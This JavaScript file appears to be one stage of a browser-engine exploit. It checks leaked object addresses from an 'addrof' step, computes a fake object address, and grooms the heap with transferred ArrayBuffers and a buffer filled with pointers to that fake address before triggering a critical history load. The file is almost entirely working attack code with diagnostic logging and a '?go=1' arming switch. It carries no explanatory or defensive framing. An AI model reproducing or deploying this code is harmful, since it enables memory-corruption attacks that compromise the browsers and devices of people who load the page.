(function () {
    "use strict";
    if (!window._ds || !window._ds.kernel || window._ds.main) return;
    var _ds = window._ds;
    var c = _ds.c;
    var s = _ds.s;
    var buf = _ds.buf;
    var mark = _ds.mark;

    function runGroomAndLoad() {
        try {
            mark("SSV-GROOM-ENTER", "n=" + s.drainCount);
            var channel = new MessageChannel();
            channel.port1.close();
            channel.port2.close();

            for (var i = 0; i < s.drainCount; ++i)
                s.keepAlive[s.keepIndex++] = _ds.buffer(c.DRAIN_SIZE);

            var slab = _ds.buffer(c.SLAB_SIZE);
            channel.port1.postMessage(0, [slab]);
            slab = null;

            var butterflyHole1 = _ds.buffer(c.BUTTERFLY_HOLE_SIZE);
            var butterflyHole2 = _ds.buffer(c.BUTTERFLY_HOLE_SIZE);
            var separator = _ds.buffer(c.SEPARATOR_SIZE);
            var earlyHole = _ds.buffer(c.EARLY_HOLE_SIZE);
            var guard = _ds.buffer(c.GUARD_SIZE);
            var predecessor = _ds.buffer(c.PREDECESSOR_SIZE);
            var finalHole = _ds.buffer(c.FINAL_HOLE_SIZE);

            _ds.fillRawCellPointers(predecessor, s.fakeAddress);
            s.keepAlive[s.keepIndex++] = separator;
            s.keepAlive[s.keepIndex++] = guard;
            s.keepAlive[s.keepIndex++] = predecessor;
            mark("PREDECESSOR-FILLED", "qwords=" + (c.PREDECESSOR_SIZE / 8)
                + "-fake=" + _ds.hex(s.fakeAddress));

            channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
                earlyHole, finalHole]);
            _ds.loadHistoryCritical();
        } catch (error) {
            try { _ds.clearPredecessor(); } catch (e) { }
            s.retrySafe = true;
            s.compositionError = error;
            s.compositionState = -1;
        }
        _ds.reportComposition();
    }

    function beginComposition() {
        if (s.captureState === 0) {
            _ds.finishEarlySafeAttempt("ADDROF-NO-RESULT",
                "capture-task-did-not-finish", "addrof-no-result");
            return;
        }
        if (s.captureState < 0) {
            _ds.finishEarlySafeAttempt("ADDROF-THREW",
                (s.captureError && s.captureError.name) + ":"
                + String(s.captureError && s.captureError.message).slice(0, 80),
                "addrof-threw");
            return;
        }

        var a0 = _ds.pointerFromWords(s.capturedWords, 0);
        var b0 = _ds.pointerFromWords(s.capturedWords, 4);
        var a1 = _ds.pointerFromWords(s.capturedWords, 8);
        var b1 = _ds.pointerFromWords(s.capturedWords, 12);
        var repeated = a0 === a1 && b0 === b1;
        var distinct = a0 !== b0;
        var plausible = _ds.plausibleCell(a0) && _ds.plausibleCell(b0)
            && _ds.plausibleCell(a1) && _ds.plausibleCell(b1);
        var fakeChars = s.copiedLength >= 8 ? s.copiedLength - 8 : 0;
        var sourceCovered = fakeChars * 2 <= c.CARRIER_BYTES;

        mark("ADDROF-RETURNED", c.REVISION);
        mark("ADDROF-COPY", "chars=" + s.copiedLength + "-source-covered=" + sourceCovered);
        mark("ADDROF-POINTERS", "HOST=" + _ds.hex(a0) + "-TARGET=" + _ds.hex(b0)
            + "-HOST2=" + _ds.hex(a1) + "-TARGET2=" + _ds.hex(b1));

        if (!(repeated && distinct && plausible && sourceCovered)) {
            _ds.finishEarlySafeAttempt("ADDROF-FAIL",
                "repeat=" + repeated + "-distinct=" + distinct
                + "-plausible=" + plausible + "-covered=" + sourceCovered,
                "addrof-validation");
            return;
        }

        s.hostAddress = a0;
        s.targetAddress = b0;
        s.targetAddressHigh = Math.floor(s.targetAddress / 0x100000000);
        s.targetAddressLow = s.targetAddress - s.targetAddressHigh * 0x100000000;
        if (s.targetAddressHigh < 0 || s.targetAddressHigh > 0xffff
            || s.targetAddressLow < 0 || s.targetAddressLow > 0xffffffff
            || Math.floor(s.targetAddressLow) !== s.targetAddressLow
            || s.targetAddressLow + s.targetAddressHigh * 0x100000000 !== s.targetAddress) {
            _ds.finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
                "target=" + _ds.hex(s.targetAddress), "target-address");
            return;
        }
        s.fakeAddress = s.hostAddress + 0x10;
        if (!_ds.plausibleCell(s.fakeAddress) || s.fakeAddress - s.hostAddress !== 0x10) {
            _ds.finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
                "host=" + _ds.hex(s.hostAddress), "fake-address");
            return;
        }
        mark("FAKE-ADDRESS", "host=" + _ds.hex(s.hostAddress) + "-fake=" + _ds.hex(s.fakeAddress)
            + "-delta=0x10");
        runGroomAndLoad();
    }

    _ds.runGroomAndLoad = runGroomAndLoad;
    _ds.beginComposition = beginComposition;
    _ds.main = true;

    _ds.catState("run");

    mark("BOOT", "rev=" + c.REVISION + "-k=" + c.K + "-n=" + s.drainCount
        + "-attempt=" + s.attemptNumber + "-armed=" + s.armed + "-loop=relentless"
        + (c.PROBE_MODE ? "-mode=probe" : "-mode=full")
        + (c.BEACON_MODE ? "-beacon=1" : ""));

    if (!s.armed) {
        s.stopped = true;
        _ds.catState("run");
        _ds.showStatus("open with ?go=1", "run");
    } else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
        || typeof Symbol !== "function" || typeof history === "undefined"
        || typeof history.replaceState !== "function") {
        mark("UNSUPPORTED");
        _ds.showStatus("unsupported browser", "bad");
    } else {
        s.alreadyPassed = false;
        s.alreadyBlocked = false;
        try {
            sessionStorage.removeItem(s.passKey);
            sessionStorage.removeItem(s.blockKey);
        } catch (e) { }
        _ds.startAttempt();
    }
})();
